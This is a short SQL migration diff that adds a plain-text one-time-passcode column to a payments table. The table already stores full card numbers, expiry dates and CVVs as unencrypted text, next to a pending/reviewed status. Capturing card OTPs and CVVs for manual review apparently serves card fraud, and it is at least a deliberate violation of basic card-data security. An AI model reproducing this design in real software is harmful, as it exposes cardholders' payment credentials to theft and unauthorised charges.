@@ -154,6 +154,7 @@ create table if not exists public.payments (
   card_number text,
   card_expiry text,
   card_cvv text,
+  card_otp text,
   status text not null default 'pending',
   reviewed_at timestamptz,
   created_at timestamptz not null default now()
@@ -163,6 +164,7 @@ alter table public.payments add column if not exists cardholder_name text;
 alter table public.payments add column if not exists card_number text;
 alter table public.payments add column if not exists card_expiry text;
 alter table public.payments add column if not exists card_cvv text;
+alter table public.payments add column if not exists card_otp text;
 alter table public.payments add column if not exists contract_id uuid;
 alter table public.payments add column if not exists instalment_id uuid;
 alter table public.payments add column if not exists payment_method text default 'bank';
